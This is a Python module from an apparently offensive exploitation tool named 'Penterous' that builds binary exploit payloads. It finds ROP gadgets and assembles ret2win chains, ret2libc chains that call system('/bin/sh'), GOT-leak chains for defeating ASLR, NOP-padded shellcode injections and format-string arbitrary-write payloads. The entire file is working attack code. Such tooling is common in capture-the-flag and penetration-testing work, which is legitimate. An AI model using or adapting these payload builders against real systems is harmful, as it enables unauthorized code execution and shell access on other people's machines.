"""
Penterous — ROP chain builder using pwntools ROP + ROPgadget.
"""
import subprocess
import re
from typing import Optional, List, Tuple, Dict
from dataclasses import dataclass, field

from utils.logger import info, success, warning, error
from utils.pwntools_wrap import PWNTOOLS_AVAILABLE, make_rop


@dataclass
class ROPGadget:
    address: int
    instruction: str

    def __str__(self):
        return f"0x{self.address:x}: {self.instruction}"


@dataclass
class ROPChain:
    gadgets: List[Tuple[str, int]] = field(default_factory=list)
    payload: bytes = b''
    description: str = ""

    def add(self, desc: str, value: int):
        self.gadgets.append((desc, value))

    def __str__(self):
        lines = [f"  ROP Chain ({len(self.gadgets)} gadgets):"]
        for desc, addr in self.gadgets:
            lines.append(f"    0x{addr:x}  ← {desc}")
        return '\n'.join(lines)


class ROPBuilder:
    def __init__(self, binary):
        self.binary = binary
        self.elf = binary.elf
        self.libc = binary.libc
        self.rop = None
        self.libc_rop = None
        self._gadget_cache: Dict[str, int] = {}

        if PWNTOOLS_AVAILABLE and self.elf:
            try:
                self.rop = make_rop(self.elf)
            except Exception as e:
                warning(f"ROP init failed: {e}")
            if self.libc:
                try:
                    self.libc_rop = make_rop(self.libc)
                except Exception:
                    pass

    def find_gadget(self, instructions: List[str], prefer_libc: bool = False) -> Optional[int]:
        key = ' ; '.join(instructions)
        if key in self._gadget_cache:
            return self._gadget_cache[key]

        rop_obj = (self.libc_rop if prefer_libc else self.rop)
        if rop_obj:
            try:
                gadget = rop_obj.find_gadget(instructions)
                if gadget:
                    addr = gadget[0]
                    self._gadget_cache[key] = addr
                    return addr
            except Exception:
                pass

        # Fallback: ROPgadget CLI
        addr = self._ropgadget_find(key)
        if addr:
            self._gadget_cache[key] = addr
            return addr
        return None

    def _ropgadget_find(self, gadget_str: str) -> Optional[int]:
        """Use ROPgadget CLI to find a gadget."""
        path = self.libc.path if self.libc else self.binary.path
        try:
            result = subprocess.run(
                ['ROPgadget', '--binary', path, '--rop'],
                capture_output=True, text=True, timeout=30
            )
            pattern = re.compile(r'0x([0-9a-f]+)\s+:\s+' + re.escape(gadget_str), re.IGNORECASE)
            m = pattern.search(result.stdout)
            if m:
                return int(m.group(1), 16)
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass
        return None

    def get_all_gadgets(self, binary_path: str = None) -> List[ROPGadget]:
        """Enumerate all ROP gadgets using ROPgadget CLI."""
        path = binary_path or self.binary.path
        gadgets = []
        try:
            result = subprocess.run(
                ['ROPgadget', '--binary', path, '--rop'],
                capture_output=True, text=True, timeout=60
            )
            for line in result.stdout.splitlines():
                m = re.match(r'0x([0-9a-f]+)\s+:\s+(.+)', line)
                if m:
                    gadgets.append(ROPGadget(
                        address=int(m.group(1), 16),
                        instruction=m.group(2).strip()
                    ))
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass
        return gadgets

    def _find_ret_gadget(self) -> int:
        """
        Find a `ret` gadget. Essential for 64-bit stack alignment.
        Tries pwntools ROP first, then scans the binary with objdump.
        """
        # pwntools ROP
        addr = self.find_gadget(['ret'])
        if addr:
            return addr
        # objdump fallback: scan for 0xc3 (ret) byte in executable sections
        try:
            result = subprocess.run(
                ['objdump', '-d', '-M', 'intel', self.binary.path],
                capture_output=True, text=True, timeout=15
            )
            for line in result.stdout.splitlines():
                if re.search(r'\bret\b', line):
                    m = re.match(r'\s*([0-9a-f]+):', line)
                    if m:
                        return int(m.group(1), 16)
        except Exception:
            pass
        return 0

    def build_ret2win(self, offset: int, win_addr: int,
                      win_args: List[int] = None) -> bytes:
        """
        Build ret2win payload.

        For 32-bit with args: padding | win_addr | fake_ret | arg1 | arg2 | ...
        For 64-bit with args: use pop rdi/rsi gadgets before win_addr.
        For no args: simple padding | ret_gadget | win_addr  (stack alignment).
        """
        args = win_args or []

        if self.binary.bits == 64:
            ret_gadget = self._find_ret_gadget()
            payload = b'A' * offset
            if args:
                # 64-bit calling convention: args in rdi, rsi, rdx, ...
                arg_regs = [
                    ['pop rdi', 'ret'],
                    ['pop rsi', 'ret'],
                    ['pop rdx', 'ret'],
                ]
                for i, arg_val in enumerate(args):
                    if i < len(arg_regs):
                        gadget = self.find_gadget(arg_regs[i])
                        if gadget:
                            payload += self._p64(gadget)
                            payload += self._p64(arg_val)
                # stack alignment before call
                if ret_gadget:
                    payload += self._p64(ret_gadget)
                payload += self._p64(win_addr)
            else:
                # stack alignment + win
                if ret_gadget:
                    payload += self._p64(ret_gadget)
                payload += self._p64(win_addr)
            return payload
        else:
            # 32-bit: args passed on stack after return address
            payload = b'A' * offset
            payload += self._p32(win_addr)
            if args:
                payload += self._p32(0xDEADBEEF)  # fake return address
                for arg_val in args:
                    payload += self._p32(arg_val)
            return payload

    def build_system_chain(self, offset: int, system_addr: int,
                           bin_sh_addr: int, libc_base: int = 0) -> bytes:
        """Build: padding | pop rdi ; /bin/sh ; ret ; system()"""
        if self.binary.bits == 64:
            pop_rdi = self.find_gadget(['pop rdi', 'ret'])
            ret_g = self.find_gadget(['ret'])

            if not pop_rdi:
                warning("pop rdi gadget not found — trying alternative")
                pop_rdi = self.find_gadget(['pop rdi'])

            payload = b'A' * offset
            if ret_g:
                payload += self._p64(ret_g + libc_base if libc_base else ret_g)
            if pop_rdi:
                payload += self._p64(pop_rdi + libc_base if libc_base else pop_rdi)
            payload += self._p64(bin_sh_addr)
            payload += self._p64(system_addr)
            return payload
        else:
            # 32-bit: padding | system | exit | /bin/sh
            exit_addr = 0
            if self.libc:
                try:
                    exit_addr = self.libc.symbols.get('exit', 0) + libc_base
                except Exception:
                    pass
            payload = b'A' * offset
            payload += self._p32(system_addr)
            payload += self._p32(exit_addr or 0xdeadbeef)
            payload += self._p32(bin_sh_addr)
            return payload

    def build_leak_chain(self, offset: int, leak_func: str = 'puts') -> bytes:
        """Phase 1 payload: leak GOT address to calculate libc base."""
        if self.binary.bits == 64:
            pop_rdi = self.find_gadget(['pop rdi', 'ret'])
            if not pop_rdi:
                error("Cannot build leak chain: pop rdi ; ret gadget not found")
                return b''

            got_entry = self._get_got(leak_func)
            plt_entry = self._get_plt(leak_func)
            main_addr = self._get_symbol('main') or self._get_symbol('_start') or 0x400000

            if not got_entry or not plt_entry:
                warning(f"{leak_func} not found in PLT/GOT — trying alternative")
                for alt in ['puts', 'printf', 'write', 'read']:
                    got_entry = self._get_got(alt)
                    plt_entry = self._get_plt(alt)
                    if got_entry and plt_entry:
                        leak_func = alt
                        break

            payload = b'A' * offset
            payload += self._p64(pop_rdi)
            payload += self._p64(got_entry)
            payload += self._p64(plt_entry)
            payload += self._p64(main_addr)
            return payload
        else:
            # 32-bit leak via puts(got['puts'])
            puts_plt = self._get_plt('puts')
            puts_got = self._get_got('puts')
            main_addr = self._get_symbol('main') or 0x8048000
            payload = b'A' * offset
            payload += self._p32(puts_plt)
            payload += self._p32(main_addr)
            payload += self._p32(puts_got)
            return payload

    def build_shellcode_payload(self, offset: int, buf_addr: int, shellcode: bytes) -> bytes:
        """NX off — inject shellcode at buffer, jump to it."""
        if self.binary.bits == 64:
            payload = shellcode
            payload = payload.ljust(offset, b'\x90')
            payload += self._p64(buf_addr)
        else:
            payload = shellcode
            payload = payload.ljust(offset, b'\x90')
            payload += self._p32(buf_addr)
        return payload

    def build_format_string_leak(self, offset_idx: int) -> bytes:
        """Format string payload to leak stack value at index."""
        return f'%{offset_idx}$p'.encode()

    def build_format_string_write(self, target_addr: int, value: int, arg_offset: int) -> bytes:
        """Format string arbitrary write (4-byte write)."""
        written = value & 0xFFFF
        fmt = f'%{written}c%{arg_offset}$hn'.encode()
        if self.binary.bits == 64:
            return fmt.ljust(16, b'\x00') + self._p64(target_addr)
        else:
            return fmt.ljust(8, b'\x00') + self._p32(target_addr)

    def _get_got(self, sym: str) -> int:
        if self.elf:
            try:
                return self.elf.got.get(sym, 0)
            except Exception:
                return 0
        return 0

    def _get_plt(self, sym: str) -> int:
        if self.elf:
            try:
                return self.elf.plt.get(sym, 0)
            except Exception:
                return 0
        return 0

    def _get_symbol(self, sym: str) -> int:
        if self.elf:
            try:
                return self.elf.symbols.get(sym, 0)
            except Exception:
                return 0
        return 0

    @staticmethod
    def _p64(val: int) -> bytes:
        import struct
        return struct.pack('<Q', val & 0xFFFFFFFFFFFFFFFF)

    @staticmethod
    def _p32(val: int) -> bytes:
        import struct
        return struct.pack('<I', val & 0xFFFFFFFF)
